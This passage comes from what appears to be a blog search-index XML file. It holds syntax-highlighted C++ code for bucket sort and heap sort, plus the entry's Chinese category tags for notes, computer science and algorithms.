punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 堆排序（32 ms）</span>    <span class="token keyword">void</span> <span class="token function">adjust</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> c1 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c2 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token punctuation">(</span>c2<span class="token operator">&lt;</span>s <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>c2<span class="token punctuation">]</span><span class="token operator">&gt;</span>nums<span class="token punctuation">[</span>c1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> c2 <span class="token operator">:</span> c1<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">&gt;</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">heapSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
